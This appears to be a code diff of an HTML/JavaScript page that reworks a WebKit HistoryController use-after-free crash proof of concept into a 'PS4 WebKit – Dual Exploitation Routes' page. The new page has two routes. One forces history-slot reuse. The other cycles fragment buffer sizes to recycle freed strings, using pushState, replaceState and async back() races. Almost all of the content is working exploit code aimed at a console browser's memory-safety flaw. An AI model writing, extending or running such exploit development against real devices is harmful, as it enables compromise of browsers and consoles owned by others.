@@ -2,108 +2,128 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>WebKit HistoryController Use-After-Free PoC</title>
+<title>PS4 WebKit – Dual Exploitation Routes</title>
+<style>
+body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
+button { padding:15px; margin:10px 0; font-size:16px; font-weight:bold; }
+#log { white-space:pre-wrap; border:1px solid #0f0; padding:10px; max-height:500px; overflow:auto; }
+.warn { color:#ff0; }
+.crit { color:#f00; }
+.ok { color:#0ff; }
+</style>
 </head>
+
 <body>
-<h1>WebKit HistoryController Use-After-Free</h1>
-<button onclick="trigger()">Trigger Crash</button>
-<pre id="log"></pre>
+<h2>PS4 WebKit – History Exploitation Routes</h2>
+
+<button onclick="runRoute1()">ROUTE 1 — SLOT REUSE (HistoryItem Collision)</button>
+<button onclick="runRoute2()">ROUTE 2 — FRAGMENT BUFFER REPLACEMENT</button>
+
+<div id="log"></div>
 
 <script>
-/*
- * WebKit HistoryController Use-After-Free
- * 
- * Affected: PS4 WebKit (and potentially other WebKit versions)
- * 
- * Description:
- * Race condition between History.replaceState() and asynchronous back()
- * operations causes use-after-free when handling large URL fragments.
- * 
- * Root Cause:
- * When multiple async back() operations are pending and replaceState()
- * modifies the current history entry with a large fragment (~695KB),
- * a pending back() operation accesses freed/invalid memory.
- * 
- * Trigger Conditions:
- * - 50 iterations of pushState + replaceState
- * - Fragment sizes growing from 977 to 709,566 bytes
- * - Async back() scheduled every 6 iterations
- * - Heap grooming (32KB per iteration)
- * - Crash occurs at iteration 48
- * 
- * Observed State (ITER 47):
- * - history.length: 32 (despite 48 pushStates)
- * - Current fragment: 666,184 bytes
- * - Heap accumulated: 1.6 MB
- * 
- * Impact:
- * Browser process crash (denial of service)
- */
+const logEl = document.getElementById("log");
+function log(m,c=""){ 
+  const s=document.createElement("span");
+  if(c) s.className=c;
+  s.textContent=m+"\n";
+  logEl.appendChild(s);
+}
+function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
 const BASE = 977;
 const STEP = 14461;
 const ITERS = 50;
 
-let heap = [];
-let sharedState = { i: 0, p: "" };
+// =====================================================
+// ROUTE 1 — SLOT REUSE / COLLISION
+// =====================================================
+async function runRoute1(){
+  logEl.textContent="";
+  log("=== ROUTE 1: SLOT REUSE ===","crit");
 
-function log(msg) {
-  document.getElementById('log').textContent += msg + '\n';
-  console.log(msg);
-}
-
-function trigger() {
-  log('Triggering WebKit HistoryController UAF...');
-  log('Expected crash at iteration 48\n');
-  
   let size = BASE;
-  
-  const interval = setInterval(() => {
-    const i = sharedState.i;
-    
-    if (i >= ITERS) {
-      clearInterval(interval);
-      log('\nUnexpected: Reached end without crash');
-      return;
+  let states = [];
+
+  for(let i=0;i<ITERS;i++){
+    const payload = "A".repeat(size);
+    const state = { idx:i, data:payload };
+
+    log(`[ITER ${i}] size=${size}`);
+    history.pushState(state,"","#"+payload);
+    history.replaceState(state,"","#"+payload);
+
+    // force circular reuse
+    if(i >= 32){
+      log("  [reuse] overwriting circular slot","warn");
+      history.pushState(
+        { idx:i, reuse:true },
+        "",
+        "#R"+i+"_"+"B".repeat(1024)
+      );
     }
-    
-    // Update shared state
-    sharedState.i = i;
-    sharedState.p = "A".repeat(size);
-    
-    // Heap grooming
-    heap.push("G".repeat(32768));
-    
-    log(`[ITER ${i}] size=${size}, heap=${(heap.length * 32 / 1024).toFixed(1)}MB`);
-    
-    // Critical sequence: pushState + replaceState
-    history.pushState(sharedState, "", "#" + sharedState.p);
-    history.replaceState(sharedState, "", "#" + sharedState.p);
-    
-    // Schedule async back() every 6 iterations
-    if (i % 6 === 0) {
-      setTimeout(() => history.back(), 0);
-      log(`  → async back() scheduled`);
+
+    if(i % 6 === 0){
+      setTimeout(()=>history.back(),0);
+      log("  async back()","warn");
     }
-    
-    // Expected crash at ITER 48 (size=695105)
-    if (i === 48) {
-      log('\n!!! CRASH EXPECTED !!!');
-    }
-    
+
     size += STEP;
-    sharedState.i++;
-  }, 5);
+    await sleep(3);
+  }
+
+  log(">>> END ROUTE 1 (should crash)","crit");
 }
 
-log('WebKit HistoryController UAF PoC loaded');
-log('Click "Trigger Crash" to reproduce\n');
-log('Technical details:');
-log('- BASE: 977 bytes');
-log('- STEP: 14,461 bytes');
-log('- Iterations: 50');
-log('- Crash point: ITER 48 (fragment size 695,105 bytes)');
-log('- Root cause: Race between replaceState and pending async back()');
+// =====================================================
+// ROUTE 2 — FRAGMENT BUFFER REPLACEMENT
+// =====================================================
+async function runRoute2(){
+  logEl.textContent="";
+  log("=== ROUTE 2: FRAGMENT BUFFER REPLACEMENT ===","crit");
+
+  let size = BASE;
+
+  for(let i=0;i<ITERS;i++){
+    let payload;
+
+    // alternate large / small to recycle StringImpl
+    if(i >= 46){
+      payload = (i % 2 === 0)
+        ? "X".repeat(32)
+        : "Y".repeat(size);
+      log(`[ITER ${i}] alternating fragment size=${payload.length}`,"warn");
+    } else {
+      payload = "A".repeat(size);
+      log(`[ITER ${i}] size=${size}`);
+    }
+
+    history.pushState({i},"","#"+payload);
+    history.replaceState({i},"","#"+payload);
+
+    if(i === 47){
+      log(">>> PRE-BACK BUFFER PRESSURE <<<","warn");
+      for(let j=0;j<200;j++){
+        location.hash = "#P"+j+"_"+"Z".repeat(64);
+      }
+    }
+
+    if(i % 6 === 0){
+      setTimeout(()=>history.back(),0);
+      log("  async back()","warn");
+    }
+
+    size += STEP;
+    await sleep(3);
+  }
+
+  log(">>> END ROUTE 2 (should crash)","crit");
+}
+
+log("Ready.");
+log("Both routes preserve original crash conditions.");
+log("Expected crash near ITER 48.");
 </script>
 </body>
 </html>
+
